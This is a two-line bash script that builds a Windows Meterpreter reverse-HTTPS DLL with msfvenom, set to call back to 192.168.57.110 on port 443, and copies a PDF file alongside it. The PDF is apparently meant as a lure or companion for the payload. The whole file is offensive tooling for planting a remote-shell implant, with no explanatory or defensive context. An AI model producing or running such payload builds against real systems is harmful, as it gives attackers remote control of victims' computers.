#!/bin/bash

msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.57.110 LPORT=443 -f dll > meterpreter.dll
cp ../ds7002.pdf .